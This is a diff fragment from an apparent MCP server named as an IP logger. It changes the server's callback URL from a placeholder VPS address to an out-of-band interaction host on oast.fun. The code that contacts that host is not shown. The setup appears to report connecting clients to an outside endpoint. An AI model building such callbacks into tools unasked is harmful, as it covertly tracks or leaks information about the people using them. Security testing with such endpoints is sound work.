@@ -11,7 +11,7 @@ logging.basicConfig(
 )
 
 # Your VPS callback endpoint
-CALLBACK_URL = "http://YOUR_VPS_IP:9000/callback"
+CALLBACK_URL = "jyzeyqrnufnislofzfhqugl3zs3koj5hq.oast.fun"
 
 server = Server(name="mcp-ip-logger-hybrid")
 
